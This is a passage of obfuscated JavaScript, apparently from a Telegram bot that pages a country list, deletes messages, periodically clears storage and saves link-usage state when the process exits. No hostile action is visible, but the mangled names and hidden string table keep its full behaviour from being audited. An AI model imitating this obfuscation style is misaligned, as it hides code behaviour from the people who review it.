_0x359013=parseInt(_0x47a795[_0x4cfd1f(0xf0)][_0x4cfd1f(0x23b)]('_')[0x1],0xa);bot['deleteMessage'](_0x978de7,_0x47a795['message']['message_id']),showCountryList(_0x978de7,_0x359013);}else{if(_0x47a795[_0x4cfd1f(0xf0)]['startsWith'](_0x4cfd1f(0x13d))){const _0xbeb9d6=parseInt(_0x47a795[_0x4cfd1f(0xf0)][_0x4cfd1f(0x23b)]('_')[0x1],0xa),_0x17c412=Math['max'](0x0,_0xbeb9d6-0x12);bot['deleteMessage'](_0x978de7,_0x47a795['message'][_0x4cfd1f(0x268)]),showCountryList(_0x978de7,_0x17c412);}}}}}),initStorage()['then'](()=>{const _0x1f5f46=a0_0x40ad1d;console[_0x1f5f46(0x1d0)](_0x1f5f46(0x27c));})['catch'](_0x26960c=>{const _0x565abf=a0_0x40ad1d;console[_0x565abf(0x252)](_0x565abf(0x26e),_0x26960c);});const clearTemporaryStorage=()=>{const _0x29d521=a0_0x40ad1d;console[_0x29d521(0x1d0)](_0x29d521(0x219));};setInterval(()=>{const _0x3f8398=a0_0x40ad1d;clearTemporaryStorage(),console[_0x3f8398(0x1d0)](_0x3f8398(0xc1));},0x2*0x3c*0x3e8);const handleExit=()=>{const _0x5286a0=a0_0x40ad1d;saveLinkUsage()[_0x5286a0(0x197)](()=>{const _0x41a611=_0x5286a0;console[_0x41a611(0x1d0)]('تم\x20حفظ\x20حالة\x20استخدام\x20الروابط.'),process['exit']();})['catch'](_0x5293cf=>{const _0x533105=_0x5286a0;console['error'](_0x533105(0x12c),_0x5293cf),process[_0x533105(0x190)](0x1);});};process['on'](a0_0x40ad1d(0x190),handleExit),process['on'](a0_0x40ad1d(0x205),handleExit),process['on']('SIGTERM',handleExit),process['on'](a0_0x40ad1d(0xf4),handleExit);
